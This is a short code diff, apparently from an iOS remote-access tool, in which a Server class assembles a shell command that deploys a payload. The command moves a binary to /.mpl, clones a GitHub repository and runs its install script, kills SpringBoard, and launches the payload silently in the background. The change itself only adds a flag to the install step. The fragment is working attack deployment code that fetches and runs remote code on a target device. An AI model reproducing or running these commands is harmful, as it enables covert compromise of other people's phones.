@@ -153,7 +153,7 @@ class Server:
             "mv /tmp/tmpmpl /.mpl;"+\
             "rm -r mouse;"+\
             "git clone https://github.com/entynetproject/mouse.git;"+\
-            "cd mouse/substrate && chmod +x install.sh && ./install.sh && killall SpringBoard;"+\
+            "cd mouse/substrate && chmod +x install.sh && ./install.sh --ignore-package && killall SpringBoard;"+\
             "/.mpl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
